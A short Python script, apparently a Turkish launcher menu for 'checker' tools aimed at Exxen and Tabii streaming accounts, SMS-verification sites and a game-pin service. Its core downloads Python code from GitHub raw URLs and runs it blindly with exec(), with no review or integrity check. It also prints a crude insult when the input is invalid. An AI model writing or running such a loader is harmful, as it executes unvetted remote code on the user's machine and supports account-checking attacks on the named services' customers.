import requests
import os
from cfonts import render            
kua = render('EN4RT', colors=['white', 'green'], align='center')
print(kua)
print("\x1b[1;39m—" * 67)
print(f"""
\x1b[38;5;117m  1\x1b[38;5;231m - EXXEN CHECKER            [ EN4RT ] | \x1b[1;32m AKTİF 
\x1b[38;5;117m  2\x1b[38;5;231m - TABİİ CHECKER            [ EN4RT ] | \x1b[1;32m AKTİF 
\x1b[38;5;117m  3\x1b[38;5;231m - SMSONAY CHECKER          [ EN4RT ] | \x1b[1;32m AKTİF \x1b[38;5;117m  
  4\x1b[38;5;231m - ONAYLASMS CHECKER        [ EN4RT ] | \x1b[1;32m AKTİF \x1b[1;32m
\x1b[38;5;117m  5\x1b[38;5;231m - S2GEPİN CHECKER          [ EN4RT ] | \x1b[1;32m AKTİF
  
""")
def kuai():
    print("\x1b[1;39m—"*67)
    print("")
    secim=input(" • Seçiminiz: ")
    baglantilar={
        "1":"https://raw.githubusercontent.com/woldemot/Sex/refs/heads/main/ExxenChecker.py",
        "2":"https://raw.githubusercontent.com/woldemot/Sex/refs/heads/main/TabiiChecker.py",
        "3":"https://raw.githubusercontent.com/woldemot/Sex/refs/heads/main/SmsOnayChecker.py",
        "4":"https://raw.githubusercontent.com/woldemot/Sex/refs/heads/main/SanalNoChecker.py",
        "5":"https://raw.githubusercontent.com/woldemot/Sex/refs/heads/main/s2gepin.py",
    }
    os.system('clear')
    if secim in baglantilar:siyonzipython(baglantilar[secim])
    else:print("2 tane sayi var zaten salak ya 1 ya 2 gircen amk beyinsizi");kuai()
    
def siyonzipython(url):
    try:exec(requests.get(url).text)
    except Exception as e:print(f"h-am{e}")
if __name__=="__main__":kuai()
    